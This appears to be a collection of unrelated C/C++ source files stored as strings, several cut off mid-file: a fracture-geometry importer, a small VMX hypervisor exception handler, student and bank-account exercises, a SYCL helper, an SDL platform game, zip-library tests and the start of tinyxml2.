    "#include \"FracturesLibrary.hpp\"\n#include \"reshaping_array.hpp\"\n#include \"Utils.hpp\"\n#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <string>\n#include <vector>\n#include <array>\n\n#include <cmath>\n\n#include \"Eigen/Eigen\"\n\nusing namespace Eigen;\nusing namespace UtilsFunction;\n\nnamespace UtilsFunction{\n\ninline bool compare_beta(const array<double,2>& arr1, const array<double,2>& arr2){\n    return arr1[1] > arr2[1];\n}\n\n/****************************************************************************************************************/\n\nbool FracturesFunctions::importData(const string& path, vector<Fracture>& lista, vector<Vector3d>& coord){\n\n    //apro il file\n    ifstream file;\n    file.open(path);\n\n    if(file.fail()){\n        cerr << \"errore nell'apertura del file di input\" << endl;\n        return false;}\n\n    //la prima riga \u00e8 di header\n    string header1;\n    getline(file, header1);\n\n    // mi salvo il numero di fratture\n    unsigned int num_fratture;\n    string line;\n    getline(file, line);\n    istringstream convert(line);\n    convert >> num_fratture;\n    lista.reserve(num_fratture);\n\n    //riservo al vettore di coordinate uno spazio superiore a quello che credo che mi servir\u00e0\n    coord.reserve(num_fratture*7);\n\n    unsigned int cont_vertici = 0;\n\n    //sfrutto la correttezza del file per leggermi le righe a gruppi di 6\n    for(unsigned int i = 0; i < num_fratture; i++){\n        Fracture frc;\n\n        //la prima riga \u00e8 di header\n        string header1;\n        getline(file, header1);\n\n        //la seconda contiene id e numero vertici\n        string id_num;\n        getline(file, id_num);\n        istringstream convert1(id_num);\n        char del;\n        convert1 >> frc.id >> del >> frc.num_vertici;\n        frc.vertices.reserve(frc.num_vertici);\n\n        //riga di intestazione\n        string header2;\n        getline(file,header2);\n\n        //adesso ho 3 righe che contengono i vertici\n        MatrixXd vert = MatrixXd::Zero(3, frc.num_vertici);\n        string line1;\n        for (unsigned int k = 0; k<3; k++){\n            getline(file,line1);\n            istringstream convert2(line1);\n            for (unsigned int l = 0; l < frc.num_vertici -1; l++){\n                char del;\n                convert2 >> vert(k,l) >> del;\n            }\n            double z2;\n            convert2 >> z2;\n            vert(k,frc.num_vertici-1) = z2;\n        }\n\n        //salvo ora le coordinate nel vettore coord e i rispettivi id nella struct Fracture\n        for (unsigned int k = 0; k < frc.num_vertici; k++)\n        {\n            Vector3d v = vert.col(k);\n            coord.push_back(v);\n            ReshapingArray::VerificaRaddoppio(coord);\n            frc.vertices.push_back(cont_vertici);\n            cont_vertici += 1;\n        }\n\n        lista.push_back(frc);\n\n    }\n\n    coord.shrink_to_fit(); //elimino la capacit\u00e0 in eccesso\n    file.close();\n    return true;\n}\n\n\nbool FracturesFunctions::NearFractures(const Fracture& frc1, const Fracture& frc2, const vector<Vector3d>& coord){\n\n    bool flag = true;\n    // vettori per le coordinate dei due baricentri (approssimativamente):\n    array<double, 3> bar1;\n    array<double,3> bar2;\n\n    //calcolo le coordinate facendo somma/numvertici per ogni coordinata\n    double sommax=0,sommay=0,sommaz=0;\n\n    for (unsigned int k = 0; k < frc1.num_vertici; k++){    // ciclo sui vertici della frattura e sommo tutte le coordinate\n\n        unsigned int id_vertice = frc1.vertices[k];\n        sommax += coord[id_vertice][0];\n        sommay += coord[id_vertice][1];\n        sommaz += coord[id_vertice][2];\n\n    };\n    bar1[0]=sommax/frc1.num_vertici;                // calcolo la coordinata del baricentro dividendo la somma delle coordinate per il numero di vertici\n    bar1[1]=sommay/frc1.num_vertici;\n    bar1[2]=sommaz/frc1.num_vertici;\n\n\n    sommax=0;\n    sommay=0;\n    sommaz=0;\n    for (unsigned int k = 0; k < frc2.num_vertici; k++){    // ripeto il calcolo anche per la seconda frattura\n\n        unsigned int id_vertice = frc2.vertices[k];\n        sommax += coord[id_vertice][0];\n        sommay += coord[id_vertice][1];\n        sommaz += coord[id_vertice][2] ;\n    };\n    bar2[0]=sommax/frc2.num_vertici;\n    bar2[1]=sommay/frc2.num_vertici;\n    bar2[2]=sommaz/frc2.num_vertici;\n\n    //calcolo i raggi delle sfere(al quadrato) e la distanza tra i due baricentri\n\n\n    // cerco il vertice con distanza massima dal baricentro, in realt\u00e0 mi interessa solo la distanza\n\n    double raggio_da_confrontare_1 = 0;\n\n    for (unsigned int j = 0; j<frc1.num_vertici; j++)   // ciclo su tutti i poligoni per calcolare la distanza massima dei vertici dal baricentro\n    {\n        double raggio1=0;\n        unsigned int id_vertice = frc1.vertices[j];  // inizializzo l'id del vertice\n        for (unsigned int i =0; i<3;i++)        // ciclo sulle 3 coordinate per calcolare il raggio del poligono\n        {\n            raggio1 += (bar1[i]-coord[id_vertice][i])*(bar1[i]-coord[id_vertice][i]);\n        }\n        if (raggio1 >= ra",
    "#include \"exception.hpp\"\n\nnamespace exception\n{\n\tauto handle_debug() -> void\n\t{\n\t\trflags g_rflags;\n\t\tia32_debugctl_register debugctl;\n\n\t\t__vmx_vmread(VMCS_GUEST_RFLAGS, &g_rflags.flags);\n\t\t__vmx_vmread(VMCS_GUEST_DEBUGCTL, &debugctl.flags);\n\n\t\t// should also check: if ((g_rflags.trap_flag && (debugctl.btf && instruction.type == branching))\n\t\tif (g_rflags.trap_flag && !debugctl.btf)\n\t\t{\n\t\t\tvmx_exit_qualification_debug_exception pending_db;\n\t\t\t__vmx_vmread(VMCS_GUEST_PENDING_DEBUG_EXCEPTIONS, &pending_db.flags);\n\t\t\tpending_db.single_instruction = true;\n\t\t\t__vmx_vmwrite(VMCS_GUEST_PENDING_DEBUG_EXCEPTIONS, pending_db.flags);\n\t\t}\n\n\t\tvmx_interruptibility_state interrupt_state;\n\t\t__vmx_vmread(VMCS_GUEST_INTERRUPTIBILITY_STATE,\n\t\t\treinterpret_cast<size_t*>(&interrupt_state.flags));\n\n\t\t// not going to clear blocked by NMI or \n\t\t// SMI stuff as IRETQ should unblock that... \n\t\t// im not emulating IRETQ instruction either...\n\t\tinterrupt_state.blocking_by_mov_ss = false;\n\t\tinterrupt_state.blocking_by_sti = false;\n\t\t__vmx_vmwrite(VMCS_GUEST_INTERRUPTIBILITY_STATE, interrupt_state.flags);\n\t}\n\n\tauto injection(interruption_type type, u8 vector, ecode_t error_code) -> void\n\t{\n\t\tvmentry_interrupt_information interrupt{};\n\t\tinterrupt.interruption_type = type;\n\t\tinterrupt.vector = vector;\n\t\tinterrupt.valid = true;\n\n\t\tif (error_code.valid)\n\t\t{\n\t\t\tinterrupt.deliver_error_code = error_code.valid;\n\t\t\t__vmx_vmwrite(VMCS_VMEXIT_INTERRUPTION_ERROR_CODE, error_code.valid);\n\t\t}\n\t\t__vmx_vmwrite(VMCS_CTRL_VMENTRY_INTERRUPTION_INFORMATION_FIELD, interrupt.flags);\n\t}\n}",
    "/*input your information and print out all of them*/\r\n\r\n#include <iostream> //Header file jekano shob standard library include kora take\r\n                    // jemon cout,cin ota\r\n#include <string>   // niche string type use kora oise 8 no line a so er lagi age header file\r\n                    // include kora lage tai okta leka osie\r\nusing namespace std;\r\nint main()\r\n{\r\n    string name, university, id, section; // 4 ta string variable declare kora oise.\r\n    cout << \"Please enter your name: \";   // leka ta print kora oise cout diya\r\n    getline(cin, name);                   // getline function diya name variable a input neya\r\n                                          // oise cin er maddome.\r\n    cout << \"Please enter your University name: \";\r\n    getline(cin, university);\r\n    cout << \"Please enter your student ID: \";  //uni, id, section er lagi o same kaj.\r\n    getline(cin, id);\r\n    cout << \"Please enter your section: \";\r\n    getline(cin, section);\r\n    cout << \"\\n\\n\";                       // 2 ta new line print kora oise.\r\n    cout << \"Name: \" << name << endl;     // name variable er modde ja input disil ta print\r\n                                          // kora osie .....baki 3 ta o same.\r\n    cout << \"University: \" << university << endl;\r\n    cout << \"ID: \" << id << endl;\r\n    cout << \"Section: \" << section << endl;\r\n    return 0;\r\n}\r\n",
    "#include \"Account.h\"\n\nusing namespace std;\n\nvoid Account::deposit(double amount)\n{\n  // Let's say deposit amount has a limit of $1500\n  // We ensure they can only depsosit a valid amount\n  if (amount <= 0) {\n    std::cerr << \"The amount you would like to deposit must be greater than 0.\\n\";\n  }\n  else if (amount > 1500.0) {\n    std::cerr << \"You can't go over your deposit limit of $1500.\\n\";\n  }\n  else {\n    balance += amount;\n    std::cout << \"You have successfully withdrawed $\" << setprecision(2) << amount << '\\n';\n    std::cout << \"Balance: \" << balance;\n  }\n}\n\nvoid Account::withdraw(double amount)\n{\n  // A user can only withdraw if the amount is less than their balance\n  // and their balance is greater than 0\n  if (amount <= 0) {\n    std::cerr << \"The amount you would like to withdraw must be greater than 0.\\n\";\n  }\n  else if (balance <= 0) {\n    std::cerr << \"Your balance must be greater than $0.\\n\";\n  }\n  else if (amount > balance) {\n    std::cerr << \"You do not have enough funds for this transaction\\n\";\n  }\n  else {\n    balance -= amount;\n    std::cout << \"You have successfully withdrawed $\" << setprecision(2) << amount << '\\n';\n    std::cout << \"Balance: \" << balance;\n  }\n}\n\ndouble Account::getBalance() const\n{\n  return balance;\n}\n\nint Account::getAccountNumber() const\n{\n  return accountNumber;\n}\n",
    "#include \"BasicKernel.h\"\n\n#ifdef _DEBUG\n#include <string>\n#include <iostream>\n#endif // _DEBUG\n\n/// <summary>\n/// \u521b\u5efa\u8ba1\u7b97\u961f\u5217\n/// </summary>\n/// <returns></returns>\nsycl::queue* CreateDPCQueue()\n{\n\t// \u6839\u636e\u9ed8\u8ba4\u7684\u8bbe\u5907\u9009\u62e9\u5668\u521b\u5efa\u961f\u5217\n\tsycl::queue* pstRetQueue = new(std::nothrow) sycl::queue(sycl::default_selector_v);\n\tif (pstRetQueue == nullptr) return nullptr;\n\n#ifdef _DEBUG\n\tstd::string strDeviceClassName;\n\tif (pstRetQueue->get_device().is_cpu()) strDeviceClassName.assign(\"CPU\");\n\telse if (pstRetQueue->get_device().is_gpu()) strDeviceClassName.assign(\"GPU\");\n\telse strDeviceClassName.assign(\"\u5176\u4ed6\u8bbe\u5907\");\n\tstd::cout << \"\u8bbe\u5907\u7c7b\u578b: \" << strDeviceClassName << std::endl\n\t\t<< \"\u8bbe\u5907\u540d\u79f0: \" <<\n\t\tpstRetQueue->get_device().get_info<sycl::info::device::name>()\n\t\t<< std::endl << \"\u8bbe\u5907\u5185\u5b58: \" <<\n\t\tpstRetQueue->get_device().get_info<sycl::info::device::global_mem_size>() / 1024.0 / 1024.0 / 1024.0 << \"GB\"\n\t\t<< std::endl << \"WorkGroup\u672c\u5730\u5185\u5b58: \" << pstRetQueue->get_device().get_info<sycl::info::device::local_mem_size>() / 1024.0 << \"KB\"\n\t\t<< std::endl << \"\u6700\u5927\u5de5\u4f5c\u7ec4\u6570: \"\n\t\t<< pstRetQueue->get_device().get_info<sycl::info::device::max_work_group_size>()\n\t\t<< std::endl << \"\u5de5\u4f5c\u7ec4\u4e0b\u7684\u6700\u5927\u5de5\u4f5c\u9879\u6570: \"\n\t\t<< pstRetQueue->get_device().get_info<sycl::info::device::max_work_item_sizes<1>>().size() << std::endl;\n#endif // _DEBUG\n\n\treturn pstRetQueue;\n}\n\n/// <summary>\n/// \u83b7\u53d6\u6700\u5927\u5de5\u4f5c\u9879\n/// </summary>\n/// <param name=\"pstDPCQueue\"></param>\n/// <returns></returns>\nsize_t GetMaxWorkItemSizes(sycl::queue* pstDPCQueue)\n{\n\treturn (pstDPCQueue != nullptr ? pstDPCQueue->get_device().get_info<sycl::info::device::max_work_item_sizes<1>>().size() : (size_t)0);\n}\n\n/// <summary>\n/// \u83b7\u53d6\u8ba1\u7b97\u6838\u5fc3\u7684\u672c\u5730\u5185\u5b58\u5927\u5c0f\n/// </summary>\n/// <param name=\"pstDPCQueue\"></param>\n/// <returns></returns>\nsize_t GetLoaclMemorySize(sycl::queue* pstDPCQueue)\n{\n\treturn (pstDPCQueue != nullptr ? pstDPCQueue->get_device().get_info<sycl::info::device::local_mem_size>() : (size_t)0);\n}\n\n/// <summary>\n/// \u5206\u914d\u5185\u5b58\n/// </summary>\n/// <param name=\"pstDPCQueue\"></param>\n/// <param name=\"nSize\"></param>\n/// <param name=\"eMemoryAlloc\"></param>\n/// <returns></returns>\nValueType* Malloc(sycl::queue* pstDPCQueue, int nSize, EMemoryAlloc eMemoryAlloc)\n{\n\tif (pstDPCQueue == nullptr || nSize <= 0) return nullptr;\n\n\tValueType* nRet = nullptr;\n\ttry\n\t{\n\t\tswitch (eMemoryAlloc)\n\t\t{\n\t\tcase Host:\n\t\t\tnRet = sycl::malloc_host<ValueType>(nSize, *pstDPCQueue);\n\t\t\tbreak;\n\t\tcase Device:\n\t\t\tnRet = sycl::malloc_device<ValueType>(nSize, *pstDPCQueue);\n\t\t\tbreak;\n\t\tcase Shared:\n\t\t\tnRet = sycl::malloc_shared<ValueType>(nSize, *pstDPCQueue);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tbreak;\n\t\t}\n\t}\n\tcatch (const std::exception&)\n\t{\n\t\treturn nullptr;\n\t}\n\n\treturn nRet;\n}\n\n/// <summary>\n/// \u91ca\u653e\u5185\u5b58\n/// </summary>\n/// <param name=\"pstDPCQueue\"></param>\n/// <param name=\"pData\"></param>\nvoid Free(sycl::queue* pstDPCQueue, ValueType* pData)\n{\n\tif (pstDPCQueue != nullptr && pData != nullptr)\n\t{\n\t\tsycl::free(pData, *pstDPCQueue);\n\t}\n}\n",
    "\n#define _USE_MATH_DEFINES\n#include<math.h>\n#include<stdio.h>\n#include<string.h>\n\nextern \"C\" {\n#include\"./SDL2-2.0.10/include/SDL.h\"\n#include\"./SDL2-2.0.10/include/SDL_main.h\"\n}\n\n#define FPS 150\n#define TARGET_TIME (1000/FPS)\n\n#define SCREEN_WIDTH\t680\n#define SCREEN_HEIGHT\t520\n#define PLATFORM_DIFF\t70\t\n#define POCZATKOWA_X_GR (SCREEN_WIDTH - (SCREEN_WIDTH * 0.96))\t// 0.95 / 0.15\n#define POCZATKOWA_Y_GR (SCREEN_HEIGHT - 43)\t// poczatkowa 43 / 403\n#define LICZBA_ETAPOW 3\n#define LICZBA_BECZEK 6\n\n#define PREDKOSC_POZIOMA\t\t160.00\n#define PREDKOSC_PIONOWA\t\t80.00\n#define PREDKOSC_GRAWITACYJNA\t120.00\n#define PREDKOSC_BECZKI\t\t\t100.0\n\n#define PLATFORMS_ONE\t7\t// iloscc platform na etap\n#define PLATFORMS_TWO\t10\n#define PLATFORMS_THREE\t10\t\n#define LADDERS_ONE\t\t6\t// ilosc drabin na etap\n#define LADDERS_TWO\t\t6\t\n#define LADDERS_THREE\t7\t\n\ntypedef struct {\n\tdouble x;\n\tdouble y;\n\tSDL_Rect rect;\n}Person;\n\ntypedef struct {\n\tSDL_Rect rect;\n} Platform;\n\ntypedef struct {\n\tSDL_Rect rect;\n} Ladder;\n\ntypedef struct {\n\tfloat x;\n\tfloat y;\n\tint pkt_kontrolny;\n\tSDL_Rect rect;\n} Barrel;\n\ntypedef struct {\n\tint x, y, w, h;\n\tbool mysz;\n} Obszar;\n\n// narysowanie napisu txt na powierzchni screen, zaczynaj\u00b9c od punktu (x, y)\n// charset to bitmapa 128x128 zawieraj\u00b9ca znaki\nvoid DrawString(SDL_Surface* screen, int x, int y, const char* text, SDL_Surface* charset) {\n\tint px, py, c;\n\tSDL_Rect s, d;\n\ts.w = 8;\n\ts.h = 8;\n\td.w = 8;\n\td.h = 8;\n\twhile (*text) {\n\t\tc = *text & 255;\n\t\tpx = (c % 16) * 8;\n\t\tpy = (c / 16) * 8;\n\t\ts.x = px;\n\t\ts.y = py;\n\t\td.x = x;\n\t\td.y = y;\n\t\tSDL_BlitSurface(charset, &s, screen, &d);\n\t\tx += 8;\n\t\ttext++;\n\t};\n};\n\n\n// narysowanie na ekranie screen powierzchni sprite w punkcie (x, y)\n// (x, y) to punkt \u0153rodka obrazka sprite na ekranie\nvoid DrawSurface(SDL_Surface* screen, SDL_Surface* sprite, int x, int y) {\n\tSDL_Rect dest;\n\tdest.x = x - sprite->w / 2;\n\tdest.y = y - sprite->h / 2;\n\tdest.w = sprite->w;\n\tdest.h = sprite->h;\n\tSDL_BlitSurface(sprite, NULL, screen, &dest);\n};\n\n\n// rysowanie pojedynczego pixela\nvoid DrawPixel(SDL_Surface* surface, int x, int y, Uint32 color) {\n\tint bpp = surface->format->BytesPerPixel;\n\tUint8* p = (Uint8*)surface->pixels + y * surface->pitch + x * bpp;\n\t*(Uint32*)p = color;\n};\n\n\n// rysowanie linii o d\u00b3ugo\u0153ci l w pionie (gdy dx = 0, dy = 1) \n// b\u00b9d\u0178 poziomie (gdy dx = 1, dy = 0)\nvoid DrawLine(SDL_Surface* screen, int x, int y, int l, int dx, int dy, Uint32 color) {\n\tfor (int i = 0; i < l; i++) {\n\t\tDrawPixel(screen, x, y, color);\n\t\tx += dx;\n\t\ty += dy;\n\t};\n};\n\n\n// rysowanie prostok\u00b9ta o d\u00b3ugo\u0153ci bok\u00f3w l i k\nvoid DrawRectangle(SDL_Surface* screen, int x, int y, int l, int k,\n\tUint32 outlineColor, Uint32 fillColor) {\n\tint i;\n\tDrawLine(screen, x, y, k, 0, 1, outlineColor);\n\tDrawLine(screen, x + l - 1, y, k, 0, 1, outlineColor);\n\tDrawLine(screen, x, y, l, 1, 0, outlineColor);\n\tDrawLine(screen, x, y + k - 1, l, 1, 0, outlineColor);\n\tfor (i = y + 1; i < y + k - 1; i++)\n\t\tDrawLine(screen, x + 1, i, l - 2, 1, 0, fillColor);\n};\n\nint checkCollision(SDL_Rect rect1, SDL_Rect rect2) {\n\treturn rect1.x < rect2.x + rect2.w &&\n\t\trect1.x + rect1.w > rect2.x &&\n\t\trect1.y < rect2.y + rect2.h &&\n\t\trect1.y + rect1.h > rect2.y;\n};\n\nbool checkCollisionAtPosition(const Platform& platform, const Ladder& drabina, int x, int y) {\n\tSDL_Rect positionRect = { x, y, 1, 1 };  // Tworzymy jednopikselowy prostok\u00b9t w danym miejscu\n\n\t// Sprawdzenie kolizji z platform\u00b9 i drabin\u00b9\n\treturn checkCollision(positionRect, platform.rect) && checkCollision(positionRect, drabina.rect);\n}\n\nbool checkCollisionAtPositionSide(const Platform& platform, Person gracz, int x, int y) {\n\tSDL_Rect positionRect = { x, y, 1, 1 };  // Tworzymy jednopikselowy prostok\u00b9t w danym miejscu\n\n\t// Sprawdzenie kolizji z platform\u00b9  i graczem od boku\n\treturn checkCollision(positionRect, platform.rect) && checkCollision(positionRect, gracz.rect);\n}\n\nint czyMyszNadObszarem(int x, int y, const Obszar* obszar) {\n\treturn (x >= obszar->x && x <= obszar->x + obszar->w &&\n\t\ty >= obszar->y && y <= obszar->y + obszar->h);\n}\n\nbool restartEtapu(double* worldTime, Person* gracz) {\n\t*worldTime = 0;\n\n\tgracz->x = (double)(POCZATKOWA_X_GR);\n\tgracz->y = (double)(POCZATKOWA_Y_GR);\n\n\tgracz->rect.x = (int)gracz->x;\n\tgracz->rect.y = (int)gracz->y;\n\n\treturn true;\n};\n// PIERWSZY ETAP\nvoid rysujPierwszy(SDL_Surface* screen, Platform platforms_one[PLATFORMS_ONE], SDL_Surface* drabina, SDL_Surface* flaga, SDL_Surface* ksiezniczka, SDL_Surface* beczka, Uint32 zielony, Uint32 czerwony) {\n\n\tfor (int i = 0; i < PLATFORMS_ONE; i++) {\n\t\tDrawRectangle(screen, platforms_one[i].rect.x, platforms_one[i].rect.y, platforms_one[i].rect.w, platforms_one[i].rect.h, zielony, czerwony);\n\t}\n\n\t// DRABINA\n\tDrawSurface(screen, drabina, SCREEN_WIDTH - 100, SCREEN_HEIGHT - 50);\n\tDrawSurface(screen, drabina, 100, SCREEN_HEIGHT - 120);\n\tDrawSurface(screen, drabina, SCREEN_WIDTH - 100, SCREEN_HEIGHT - 190);\n\tDrawSurface(screen, drabina, 100, SCREEN_HEIGHT - 260);\n\tDrawSurface(screen, drabina, SCREEN_WIDTH - 100, SCREEN_HEIGHT - 330)",
    "#include <windows.h>\n#include <tchar.h>\n#include <stdio.h>\n#include \"../../zip.h\"\n#include \"../../unzip.h\"\n\n// This program runs a bunch of test cases on zip/unzip.\n// Most of the test cases come from bugs that had been reported\n// in an earlier version of the ziputils, to be sure that they're fixed.\n\n\n\nbool tsame(const FILETIME t0, const FILETIME t1)\n{ if (t0.dwHighDateTime!=t1.dwHighDateTime) return false;\n  if ( (t0.dwLowDateTime>>28) != (t1.dwLowDateTime>>28)) return false;\n  return true;\n  // we allow some flexibility in the lower bits. That's because zip's don't store times with as much precision.\n}\n\nbool fsame(const TCHAR *fn0, const TCHAR *fn1)\n{ HANDLE hf0=CreateFile(fn0,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);\n  HANDLE hf1=CreateFile(fn1,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);\n  if (hf0==INVALID_HANDLE_VALUE || hf1==INVALID_HANDLE_VALUE)\n  { if (hf0!=INVALID_HANDLE_VALUE) CloseHandle(hf0);\n    if (hf1!=INVALID_HANDLE_VALUE) CloseHandle(hf1);\n    return false;\n  }\n  DWORD size0=GetFileSize(hf0,0), size1=GetFileSize(hf1,0);\n  if (size0!=size1) {CloseHandle(hf0); CloseHandle(hf1); return false;}\n  DWORD size=size0;\n  //\n  char *buf[2]; buf[0]=new char[16384]; buf[1]=new char[16384];\n  DWORD done=0;\n  while (done<size)\n  { DWORD left=size-done; if (left>16384) left=16384;\n    DWORD red; ReadFile(hf0,buf[0],left,&red,0); ReadFile(hf1,buf[1],left,&red,0);\n    if (memcmp(buf[0],buf[1],left)!=0) break;\n    done+=left;\n  }\n  delete[] buf[0]; delete[] buf[1];\n  CloseHandle(hf0); CloseHandle(hf1);\n  return (done==size);\n}\n\nvoid SaveResource(const TCHAR *res, const TCHAR *fn)\n{ HINSTANCE hInstance = GetModuleHandle(0);\n  HRSRC hrsrc=FindResource(hInstance,res,RT_RCDATA);\n  HANDLE hglob = LoadResource(hInstance,hrsrc);\n  void *buf=LockResource(hglob);\n  unsigned int len=SizeofResource(hInstance,hrsrc);\n  HANDLE hf = CreateFile(fn,GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);\n  DWORD writ; WriteFile(hf,buf,len,&writ,0);\n  CloseHandle(hf);\n}\n\nbool any_errors=false; bool p_abort=false;\nvoid msg(const TCHAR *s)\n{ if (s[0]=='*') any_errors=true;\n#ifdef UNDER_CE\n  int res=IDOK;\n  if (s[0]=='*') res=MessageBox(0,s,_T(\"Zip error\"), MB_ICONERROR|MB_OKCANCEL);\n  else if (s[0]=='.') MessageBeep(0);\n  else MessageBox(0,s,_T(\"Zip test\"),MB_OKCANCEL);\n  if (res==IDCANCEL) p_abort=true;\n#else\n  _tprintf(_T(\"%s\\n\"),s);\n#endif\n}\n\n\nvoid main()\n{ HZIP hz; HANDLE hf; DWORD writ; ZRESULT zr; ZIPENTRY ze; TCHAR m[1024];\n  bool fast=false;\n#ifdef UNDER_CE\n  fast=true;\n#endif\n#ifdef __CODEGUARD__\n  fast=true;\n#endif\n  \n\n  msg(_T(\"Zip-utils tests. Files will be left in \\\"\\\\z\\\"\"));\n  CreateDirectory(_T(\"\\\\z\"),0);\n  SaveResource(MAKEINTRESOURCE(1),_T(\"\\\\z\\\\extra.zip\"));\n  SaveResource(MAKEINTRESOURCE(2),_T(\"\\\\z\\\\ce2ce.jpg\"));\n  SaveResource(MAKEINTRESOURCE(3),_T(\"\\\\z\\\\ce2ce.txt\"));\n\n\n  \n\n  // fixed bug: OpenZip errors and returns0 when you try to open a zip with no files in it\n  msg(_T(\"empty - testing whether it fails to open empty zipfiles\"));\n  hz=CreateZip(_T(\"\\\\z\\\\empty.zip\"),0); if (hz==0) msg(_T(\"* Failed to create empty.zip\"));\n  zr=CloseZip(hz); if (zr!=ZR_OK) msg(_T(\"* Failed to close empty.zip\"));\n  if (p_abort) return;\n  hz=OpenZip(_T(\"\\\\z\\\\empty.zip\"),0); if (hz==0) msg(_T(\"* Failed to open empty.zip\"));\n  zr=GetZipItem(hz,-1,&ze); if (zr!=ZR_OK) msg(_T(\"* Failed to get empty.zip index\"));\n  zr=CloseZip(hz); if (zr!=ZR_OK) msg(_T(\"* Failed to close empty.zip\"));\n  if (p_abort) return;\n\n  // fixed bug: IsZipHandle should return false for a NULL handle.\n  msg(_T(\"IsZipHandle - testing whether 0 is considered a handle\"));\n  bool b = IsZipHandleZ(0) || IsZipHandleU(0);\n  if (b) msg(_T(\"IsZipHandle failed to deny handlehood of NULL\"));\n  if (p_abort) return;\n  \n  // fixed bug: if one file is bigger then the following must be smaller than 64k -- diff. between release and debug mode\n  // fixed bug: test0=71k, test1=152.2k, test2=145b, test3=120k, here test3 returns ZR_WRITE\n  msg(_T(\"sizes - testing whether large-then-small files work okay\"));\n  { char *c=new char[200*1024]; for (int i=0; i<200*1024; i++) c[i]=(char)(rand()%255);\n    hf=CreateFile(_T(\"\\\\z\\\\sizes-71k.dat\"),GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0); WriteFile(hf,c,71*1024,&writ,0); CloseHandle(hf);\n    hf=CreateFile(_T(\"\\\\z\\\\sizes-152_2k.dat\"),GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0); WriteFile(hf,c,152*1024+1024/5,&writ,0); CloseHandle(hf);\n    hf=CreateFile(_T(\"\\\\z\\\\sizes-145b.dat\"),GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0); WriteFile(hf,c,145,&writ,0); CloseHandle(hf);\n    hf=CreateFile(_T(\"\\\\z\\\\sizes-120k.dat\"),GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0); WriteFile(hf,c,120*1024,&writ,0); CloseHandle(hf);\n    delete[] c;\n  }\n  //\n  hz=CreateZip(_T(\"\\\\z\\\\sizes.zip\"),0); if (hz==0) msg(_T(\"* Failed to create sizes.zip\"));\n  zr=ZipAdd(hz,_T(\"sizes-71k.out.dat\"),_T(\"\\\\z\\\\sizes-71k.dat\")); if (zr!=ZR_OK) msg(_T(\"* Failed to add 71k\"));\n  zr=ZipAdd(hz,_T(\"sizes-152_2k.out.dat\")",
    "/*\r\nOriginal code by Lee Thomason (www.grinninglizard.com)\r\n\r\nThis software is provided 'as-is', without any express or implied\r\nwarranty. In no event will the authors be held liable for any\r\ndamages arising from the use of this software.\r\n\r\nPermission is granted to anyone to use this software for any\r\npurpose, including commercial applications, and to alter it and\r\nredistribute it freely, subject to the following restrictions:\r\n\r\n1. The origin of this software must not be misrepresented; you must\r\nnot claim that you wrote the original software. If you use this\r\nsoftware in a product, an acknowledgment in the product documentation\r\nwould be appreciated but is not required.\r\n\r\n2. Altered source versions must be plainly marked as such, and\r\nmust not be misrepresented as being the original software.\r\n\r\n3. This notice may not be removed or altered from any source\r\ndistribution.\r\n*/\r\n\r\n#include \"tinyxml2.h\"\r\n\r\n#include <new>\t\t// yes, this one new style header, is in the Android SDK.\r\n#if defined(ANDROID_NDK) || defined(__BORLANDC__) || defined(__QNXNTO__)\r\n#   include <stddef.h>\r\n#   include <stdarg.h>\r\n#else\r\n#   include <cstddef>\r\n#   include <cstdarg>\r\n#endif\r\n\r\n#if defined(_MSC_VER) && (_MSC_VER >= 1400 ) && (!defined WINCE)\r\n\t// Microsoft Visual Studio, version 2005 and higher. Not WinCE.\r\n\t/*int _snprintf_s(\r\n\t   char *buffer,\r\n\t   size_t sizeOfBuffer,\r\n\t   size_t count,\r\n\t   const char *format [,\r\n\t\t  argument] ...\r\n\t);*/\r\n\tstatic inline int TIXML_SNPRINTF( char* buffer, size_t size, const char* format, ... )\r\n\t{\r\n\t\tva_list va;\r\n\t\tva_start( va, format );\r\n\t\tconst int result = vsnprintf_s( buffer, size, _TRUNCATE, format, va );\r\n\t\tva_end( va );\r\n\t\treturn result;\r\n\t}\r\n\r\n\tstatic inline int TIXML_VSNPRINTF( char* buffer, size_t size, const char* format, va_list va )\r\n\t{\r\n\t\tconst int result = vsnprintf_s( buffer, size, _TRUNCATE, format, va );\r\n\t\treturn result;\r\n\t}\r\n\r\n\t#define TIXML_VSCPRINTF\t_vscprintf\r\n\t#define TIXML_SSCANF\tsscanf_s\r\n#elif defined _MSC_VER\r\n\t// Microsoft Visual Studio 2003 and earlier or WinCE\r\n\t#define TIXML_SNPRINTF\t_snprintf\r\n\t#define TIXML_VSNPRINTF _vsnprintf\r\n\t#define TIXML_SSCANF\tsscanf\r\n\t#if (_MSC_VER < 1400 ) && (!defined WINCE)\r\n\t\t// Microsoft Visual Studio 2003 and not WinCE.\r\n\t\t#define TIXML_VSCPRINTF   _vscprintf // VS2003's C runtime has this, but VC6 C runtime or WinCE SDK doesn't have.\r\n\t#else\r\n\t\t// Microsoft Visual Studio 2003 and earlier or WinCE.\r\n\t\tstatic inline int TIXML_VSCPRINTF( const char* format, va_list va )\r\n\t\t{\r\n\t\t\tint len = 512;\r\n\t\t\tfor (;;) {\r\n\t\t\t\tlen = len*2;\r\n\t\t\t\tchar* str = new char[len]();\r\n\t\t\t\tconst int required = _vsnprintf(str, len, format, va);\r\n\t\t\t\tdelete[] str;\r\n\t\t\t\tif ( required != -1 ) {\r\n\t\t\t\t\tTIXMLASSERT( required >= 0 );\r\n\t\t\t\t\tlen = required;\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tTIXMLASSERT( len >= 0 );\r\n\t\t\treturn len;\r\n\t\t}\r\n\t#endif\r\n#else\r\n\t// GCC version 3 and higher\r\n\t//#warning( \"Using sn* functions.\" )\r\n\t#define TIXML_SNPRINTF\tsnprintf\r\n\t#define TIXML_VSNPRINTF\tvsnprintf\r\n\tstatic inline int TIXML_VSCPRINTF( const char* format, va_list va )\r\n\t{\r\n\t\tint len = vsnprintf( 0, 0, format, va 